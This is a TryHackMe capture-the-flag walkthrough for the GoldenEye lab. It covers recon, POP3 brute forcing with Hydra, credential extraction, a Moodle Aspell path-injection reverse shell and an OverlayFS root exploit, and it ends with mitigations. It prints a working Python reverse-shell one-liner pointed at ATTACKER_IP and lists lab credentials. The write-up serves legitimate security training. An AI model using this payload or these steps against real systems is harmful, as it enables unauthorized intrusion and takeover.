# GoldenEye – TryHackMe Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 13, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open network services and enumerate web content.
- **Nmap Scan:**
```bash
nmap -p- <ip_address>
```

- **Findings:**
- Port 80: HTTP (web app with hints in source code)
- Ports 55006/55007: POP3 (Dovecot)
- Port 25: SMTP
- **Focus:** Web application source + unidentified POP3 services.

---

## 2. Exploitation Process

### Step 1 – Web Source Inspection
- Found `terminal.js` with HTML-encoded credentials:
boris:InvincibleHack3r

text
- Hint indicated `/sev-home/` path and more users.

### Step 2 – POP3 Enumeration & Brute Force
- Discovered POP3 services on ports 55006 and 55007:
nmap -sV -p 55006,55007 <ip_address>

text
- Used `hydra` with a fast wordlist to brute force passwords for(use fasttrack.txt as password list for faster results):
- boris
- natalya
- dr_doak
- Extracted more credentials from emails (xenia, admin).

### Step 3 – Sensitive File Enumeration
- dr_doak’s profile → `secret.txt` referenced a JPG.
- Used `exiftool` to reveal Base64-encoded admin credentials.

### Step 4 – Moodle Reverse Shell
- Logged into Moodle as admin.
- Modified `Aspell` binary path to a Python reverse shell payload.
- Triggered via spellcheck in a blog post editor → got low-priv shell.

---

## 3. Proof of Concept (PoC)

- Successfully logged into Moodle admin with extracted credentials.
- Reverse shell obtained from `Aspell` misconfiguration.
- Example payload:
```python
python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER_IP",443));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
subprocess.call(["/bin/sh","-i"])'
```
---

## 4. Privilege Escalation

- OS: Ubuntu 14.04.1 → vulnerable to **OverlayFS (EDB-37292)**.
- Modified exploit to use `cc` compiler instead of `gcc`.
- Executed exploit → **root shell obtained**.
- Retrieved `/root/root.txt` flag.

---

## 5. Mitigation Recommendations

- **Credential Security:** Never embed creds in web code or files. Use hashing/vaults.
- **POP3 Hardening:** Enforce strong passwords, enable lockouts, disable if unused.
- **File Permissions:** Restrict access to sensitive files (secret.txt, PGP keys).
- **Web App Hardening:** Validate system path inputs in apps like Moodle.
- **OS Patching:** Apply OverlayFS fixes or upgrade to supported Ubuntu.
- **Compiler Restrictions:** Remove compiler tools from production systems.

---

## 6. Lessons Learned

- Client-side code can leak critical credentials.
- Multiple low-severity issues can chain into full compromise.
- Legacy OS + known exploits = easy privilege escalation.

---

## 7. Skills Practiced

- **Recon:** Nmap, service enumeration
- **Brute-force:** Hydra for POP3
- **File Analysis:** exiftool metadata extraction
- **Web Abuse:** Moodle RCE via path injection
- **Kernel Exploit:** OverlayFS privilege escalation
